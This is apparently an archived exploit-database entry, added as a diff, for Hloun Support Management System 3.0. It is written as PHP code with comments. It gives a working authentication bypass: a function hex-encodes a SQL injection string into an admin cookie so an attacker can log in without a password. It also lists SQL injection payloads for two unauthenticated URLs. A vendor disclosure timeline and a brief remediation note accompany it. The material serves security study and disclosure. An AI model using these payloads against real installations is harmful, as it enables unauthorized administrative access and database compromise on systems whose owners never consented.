@@ -1,0 +1,86 @@
+id: 20745
+date: 05/08/2013
+title: Hloun Support Management System 3.0 SQL Injection / Bypass
+author: i-Hmx
+cves: 
+
+<?
+/*
+Hloun support management system , version 3.0
+Authentication Bypass Exploit , Multi SQL Vulns
+By : Faris , aka (i-Hmx)
+n0p1337@gmail.com
+Home : sec4ever.com , 1337s.cc
+
+[+] Exploit Time Line
+    - 03/11/2012 Vulnerubility Discovered
+  - 06/11/2012 Vendor was contacted , Proof of concept provided
+  - 07/11/2012 Vendor replied
+  - 10/11/2012 New patched version Released
+  - 06/05/2013 Disclosed to public
+  
+[+] Disclosed for educational purposes only
+
+I - Auth Bypass Exploit
+At admin cp
+File : hloun.php
+Line : 41
+if(isset($_COOKIE['online']) || !empty($_COOKIE['online_admin'])){
+$member_hash = $hloun->fix_hash_user($_COOKIE['online_admin']);
+  $user_query  = "SELECT * FROM `member` WHERE `username`='".$member_hash['username']."' AND `password`='".$member_hash['password']."'";
+  $member  = $hloun->db->fetch_array($user_query);
+  $group_query  = "SELECT * FROM `group` WHERE `id`='".$member['group']."'";
+    $group  = $hloun->db->fetch_array($group_query);
+  if(($hloun->db->num_rows($user_query) == 1) and ($group['allow_admin'] == 1)){
+  $member_online = 1;
+  }else{
+  $member_online = 0;
+  }
+  }
+Cookies are decoded via fix_hash_user function at /include/system/hloun.system.php
+Cookies data are not secured before being passed to sql query
+if attacker have valid admin name he can encode auth bypass code and login without password
+Exploit Example : 
+*/
+$username="soudy_ma"; // Must be true , usually 'admin' or u can get it by opening ticket and name of the admin will be displayed when reply
+function faencode($user){
+        $strl_user = strlen($user);
+        $hash = '';
+        for($i =0; $i < $strl_user; $i++){
+            $hash .= dechex(ord($user[$i]));
+        }
+        return $hash;
+    }
+
+$en=faencode("$username' or '3'='3#");
+echo "Set cookies to : online_admin=".$en."-faris@sec4ever1337s";
+
+/*
+User panel also vulnerable to the same attack
+Secure : u need to secure $member_hash['username'] and same for user panel
+
+II - Sql injection at index.php < No authentication Required >
+http://localhost/lab/hlion/index.php?page=set&step=currency&id=fa' or 1=1--
+parameter id is not santiasized enough before being quered
+function security($var,$type){
+switch($type){
+case 'html':
+$var = htmlspecialchars($var);
+break;
+
+htmlspecialchars is not enough at all :)
+u need to add mysql_real_escape_string for more security
+Require magic_quotes=off
+
+III - SQL Injection at adminpanel < No authentication Required >
+http://localhost/lab/hlion/admin/index.php?page=user&step=ok
+Post : username=fa' or 1=1--&password=dsfsda&submit=%D8%AA%D8%B3%D8%AC%D9%8A%D9%84+%D8%A7%D9%84%D8%AF%D8%AE%D9%88%D9%84
+Same thing :)
+
+regards,
+faris (i-Hmx)
+sec4ever team
+*/
+?>
+
+#  0day.today [2023-03-22]  #
